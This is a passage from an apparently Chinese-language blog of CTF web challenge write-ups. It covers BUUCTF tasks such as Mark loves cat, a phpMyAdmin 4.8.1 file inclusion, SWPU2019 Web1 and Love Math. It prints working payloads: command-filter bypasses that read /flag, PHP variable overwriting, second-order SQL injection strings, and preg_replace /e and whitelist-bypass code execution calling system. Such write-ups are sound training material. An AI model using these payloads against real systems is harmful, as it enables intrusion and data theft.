class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%8</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%E2</span><span class="symbol">%0</span>EI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%7</span>EW<span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%16</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span>e<span class="symbol">%5</span>B<span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>EV<span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span>&amp;b=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%0</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span>b<span class="symbol">%0</span>FI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%FEW</span><span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%96</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span><span class="symbol">%E5Z</span><span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>E<span class="symbol">%D6</span><span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span></span><br></pre></td></tr></table></figure><p>不能用数组绕过，<code>string</code>强制类型转换后都是 “Array”</p><p>命令禁用了很多，但<strong>linux命令中可以加\，所以甚至可以ca\t /fl\ag</strong></p><p><img src="/2020/08/8月刷题记录/image-20200810172023014.png" alt="image-20200810172023014"></p><p><img src="/2020/08/8月刷题记录/image-20200810172043258.png" alt="image-20200810172043258"></p><p>其他思路1：</p><p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p><p>其他思路2：</p><p>把flag移到web目录下，然后直接访问拿到flag</p><p><img src="/2020/08/8月刷题记录/image-20200810172253738.png" alt="image-20200810172253738"></p><p><img src="/2020/08/8月刷题记录/image-20200810172317785.png" alt="image-20200810172317785"></p><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>.git泄露，githack拿源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;<span class="comment">//GET方式传flag,且flag=flag</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;<span class="comment">//GET和POST其中之一必须传flag</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;<span class="comment">//GET和POST传flag,不能是flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure><p>存在变量覆盖</p><p>payload1: <code>yds=flag</code></p><p><code>$$x = $$y</code>  =&gt; <code>$(yds) = $(flag)</code> =&gt; <code>$yds=flag{xxxx}</code> =&gt; <code>exit($yds)</code></p><p>payload2:<code>is=flag&amp;flag=flag</code></p><p><code>$$x = $$y</code> =&gt; <code>$(is)=$(flag)</code> =&gt; <code>$is=flag{xxxx}</code></p><p><code>$$xx = $$y</code> =&gt; <code>$(flag)=$(flag)</code> =&gt; <code>$flag=flag{xxxx}</code></p><p><code>exit($is)</code></p><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>扫描到phpinfo.php和phpmyadmin 4.8.1</p><p>参考这篇文章：<a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" target="_blank" rel="noopener">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/</a> </p><p>有一个文件包含漏洞，加上phpinfo.php上传临时文件getshell (:</p><p>想复杂了，直接包含/flag就行</p><p>payload:<code>http://e5abf389-9025-4a73-a415-3e10dc57dc21.node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../..//flag</code></p><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>在<a href="https://www.compart.com/en/unicode/搜索" target="_blank" rel="noopener">https://www.compart.com/en/unicode/搜索</a> <strong>thousand</strong>找大于1337的字符</p><p><img src="/2020/08/8月刷题记录/image-20200810230209866.png" alt="image-20200810230209866"></p><p>提交 <code>%E1%8D%BC</code>即可得到flag</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>按照提示加入header</p><p>1.Client-IP</p><p>2.X-Forwarded-For</p><p>3.Remote_Addr</p><p>均可以修改IP</p><p>php下的模板注入</p><p><img src="/2020/08/8月刷题记录/image-20200810232530556.png" alt="image-20200810232530556"></p><h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>登录了之后在发布广告处存在sql注入漏洞，我们输入的内容在输入后没有漏洞，当我们发布广告后查看广告详情的时候就造成了二次注入，从而产生了注入。</p><p>题目环境过滤了空格，我们使用/**/来进行绕过过滤了or，因此我们无法使用order by 以及information_schema这个库因为过滤了注释符，所以查询语句的最后我们要闭合单引号</p><p>无列名注入</p><p><code>1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/’</code></p><p>这里我们将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a,b，这样我们后面就直接查询a,b列就可以获得结果</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200812174257429.png" alt="image-20200812174257429"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">true@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replace()使用的/e模式可以存在<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">远程执行代码</a></p><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?.*=&#123;<span class="variable">$&#123;phpinfo()&#125;</span>&#125;</span><br><span class="line">\S*=<span class="variable">$&#123;phpinfo()&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200812174555693.png" alt="image-20200812174555693"></p><h3 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h3><p>确实第一</p><p>抓包发现 L0g1n.php</p><p><img src="/2020/08/8月刷题记录/image-20200812181110056.png" alt="image-20200812181110056"></p><p><img src="/2020/08/8月刷题记录/image-20200812181236407.png" alt="image-20200812181236407"></p><p>各种header集合</p><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html,application/json</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td>Cookie</td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td>From</td><td>发出请求的用户的Email</td><td>From: <a href="mailto:user@email.com" target="_blank" rel="noopener">user@email.com</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td>Referer</td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives…</a></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td>Upgrade</td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td>User-Agent</td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1:</p><p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span 